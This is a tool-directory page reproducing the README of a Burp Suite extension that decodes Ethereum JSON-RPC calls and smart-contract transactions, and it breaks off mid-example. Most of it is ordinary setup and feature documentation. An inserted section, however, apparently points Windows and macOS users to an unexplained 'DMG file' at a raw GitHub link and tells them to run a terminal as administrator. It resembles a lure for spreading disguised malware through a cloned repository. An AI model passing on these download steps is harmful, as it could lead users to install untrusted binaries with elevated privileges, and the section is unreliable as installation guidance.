---
title: web3-decoder
url: https://kitploit.com/en/tools/github/uwctcjnwlk/web3-decoder
source: Kitploit
date: 2026-08-30
fetch_date: 2026-08-31T07:52:57.635040
---

# web3-decoder

[Skip to content](#main-content)

[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories

EN

[Submit](/en/submit)

[Tools](/en/tools)[Blog](/en/blog)Categories

[Submit](/en/submit)

EN

Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!

Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.

·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit

Tool Directory

## Categories

[View all categories](/en/categories)

Loading categories

web3-decoder — Burp Suite extension for decoding Ethereum JSON-RPC calls and smart contract interactions, supporting multiple chains and automatic ABI retrieval. | Kitploit

[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/uwctcjnwlk/web3-decoder

![](https://assets.kitploit.com/production/public/tools/53508/e276645d359aa385eed1e818f67bac7f5ef0a0a12771e224068c407fb09c5e96-display-v1.webp)

[Vulnerability Analysis](/en/categories/vulnerability-analysis)[Reverse Engineering](/en/categories/reverse-engineering)[Web Security](/en/categories/web-security)[Penetration Testing](/en/categories/penetration-testing)[API Security](/en/categories/api-security)

![GitHub](/providers/github.png)uwctcjnwlk/web3-decoder

# web3-decoder

Burp Suite extension for decoding Ethereum JSON-RPC calls and smart contract interactions, supporting multiple chains and automatic ABI retrieval.

[View Repository](https://github.com/uwctcjnwlk/web3-decoder)

215414810 days ago![Reviewed by Kitploit](/_next/image?url=%2Fbadges%2Fkitploit_badge_reviewed_full.png&w=48&q=75)

### Most Popular

[View all →](/en/tools)

Discover the most used tools by our community.

Last 7 DaysLast 30 Days

Explore all tools

Browse our collection of tools

[View all tools →](/en/tools)

Share

# Web3 Decoder

Web3 Decoder is a Burp Suite Extension designed for analyzing blockchain operations
and smart contract interactions. It processes JSON-RPC calls to Ethereum and compatible networks
(including Polygon, Arbitrum, BSC, and others)

## Block explorers API Keys

Most block explorers supported, like [etherscan.io](https://etherscan.io) require an API key to allow more than 1 request each 5 seconds.

To add your API keys you have 2 options:

* You can add your API keys modifying the [.api\_keys.json](https://github.com/uwctcjnwlk/web3-decoder/blob/HEAD/.api_keys.json) file
* You can add Environment variables with the same names as the ones in the API\_KEYS.json file
  + e.g.: export ETHERSCAN\_API=YOURAPIKEY

## Manually adding a contract's ABI

The extension caches the downloaded ABIs from the block explorers like etherscan
inside a folder named `.abi_caches` in JSON format. You can simply add a new file inside that folder,
with the following naming convention:

{chain\_id}\_{contract\_address.lower()}.abi

For example:

root@kitploit:~

```
# Ethereum Mainnet (chain ID 1), contract 0xfbdca68601f835b27790d98bbb8ec7f05fdeaa9b
1_0xfbdca68601f835b27790d98bbb8ec7f05fdeaa9b.abi

# Polygon (chain id 137), contract 0x447646e84498552e62ecf097cc305eabfff09308
137_0x447646e84498552e62ecf097cc305eabfff09308.abi
```

## **Attention Windows & macOS Users:**

This documentation applies to Windows and Linux; macOS users can use the [DMG file](https://raw.githubusercontent.com/uwctcjnwlk/releases).

Check for Git and Python on your system.

<https://git-scm.com/install/windows>

<https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe>

Start a terminal session as administrator.

## Precompiled Binaries and Python3 Virtualenv

This extension requires python3 libraries like web3.py that unfortunately are not available for python 2.7
to be used directly with Jython 2.7. As a 'hack', the main functionality is written in a python 3 library
that is being executed by the extension through a python virtual environment (talking about dirty...)

I have created precompiled binaries of the python3 library used, for Linux, Windows and Mac OSX.
The extension will use these binaries if it is not able to execute the library.
For better performance or development, you can create a virtualenv, and install as follows:

root@kitploit:~

```
cd "web3-decoder"
virtualenv -p python3 venv
source venv/bin/activate
pip install web3 py-evm
```

The extension will make calls to the library using the created virtualenv.

Once the virtualenv is created, you can add the python extension by selecting the burp\_web3\_decoder.py file in the Extender
tab of Burp Suite

## Features and TODOs

* [x]  Burp EditorTab added to compatible Requests and Responses
* [x]  Decode of `eth_call` JSON-RPC calls
* [x]  Decode of `eth_sendRawTransaction` JSON-RPC calls (and their inner functions)
* [x]  Decode of response results from `eth_call`
* [x]  Support for re-encoding of `eth_call` decoded functions
* [x]  Automatic download of the smart contract ABI called from etherscan APIs (if the contract is verified)
* [x]  Decode of function inputs both in `eth_call` and `eth_sendRawTransaction`
* [x]  Decode of function inputs that uses "Delegate Proxy" contracts
* [x]  Decode of function inputs called via "Multicall" contracts
* [x]  Manual addition of contract ABIs for contracts that are not verified in etherscan
  + [ ]  Allow to make this from Burp interface, instead of writing the JSON to a file
* [x]  Pre-compiled binaries to allow the extension to work without setup
* [x]  Support for other compatible networks (Polygon, Arbitrum, Fantom, BSC, etc.)
* [ ]  Support for re-signing a modified decoded rawTransaction (requires input of privateKey)

## Chains Supported so far

All supported chains can be found in the [chains.json](https://github.com/uwctcjnwlk/web3-decoder/blob/HEAD/chains.json) file.
These are chains that have a block explorer with the same APIs as etherscan.
If you want to add more blockchain explorers, add them to the [chains.json](https://github.com/uwctcjnwlk/web3-decoder/blob/HEAD/chains.json) file, test it, and make a pull request!

* Ethereum Mainnet
* Ropsten
* Rinkeby
* Goerli
* Optimism
* Cronos
* Kovan
* BSC
* Huobi ECO
* Polygon
* Fantom
* Arbitrum
* Sepolia
* Aurora
* Avalanche

## Examples

For more examples, including proxy and multicall calls, see the [EXAMPLES.md](https://github.com/uwctcjnwlk/web3-decoder/blob/HEAD/docs/EXAMPLES.md)

**eth\_call**:

Raw:
![image](https://assets.kitploit.com/production/public/readmes/53508/e276645d359aa385eed1e818f67bac7f5ef0a0a12771e224068c407fb09c5e96/14ceb0867f5ef4964d89c46c708ca2ccca072ba1157bb7009ff46eb4b3a86daf-display-v1.webp)

Decoded:
![image](https://assets.kitploit.com/production/public/readmes/53508/4a2381244e37871e17156d3f3ebc6b7ed112488d496f0ea75fbc137c4b8b9b5e/e1263cacf2410a550f869e80afa274ae2cb770e0c8034aeb47c7139df80686a4-display-v1.webp)

**eth\_sendRawTransaction** (Uniswap v2 test):

root@kitploit:~

```
{
    "method": "eth_sendRawTransaction",
    "params": [
        "0x02f9015b820539808459682f00850df8475800830493e0947a250d5630b4cf539739df2c5dacb4c659f2488d880de0b6b3a7640000b8e47ff36ab500000000000000000000000000000000000000000000009e0950598867d8000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000002105eaa660ff62b14a5e093fc348e13ab63af2e600000000000000000000000000000000000000000000000000000000623b16570000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000006b175474e89094c44da98b954eedeac495271d0fc001a005cfdf9ff11dea2d3e8781cb6ba140ae6e86a0922bfa75938b6f2456f513e24ca057f02b3f7125edb59e22651d503bc296153860e3843f9d495ad21d898c8e20c3"
    ],
    "id": 4700418092893,
    "jsonrpc": "2.0"
}
```

Decoded:

root@kitploit:~

```
[
  {
    "chain_id": 1337,
    "access_list": [],
    "nonce": 0,
    "r": 26288449867848803784346986899407651815...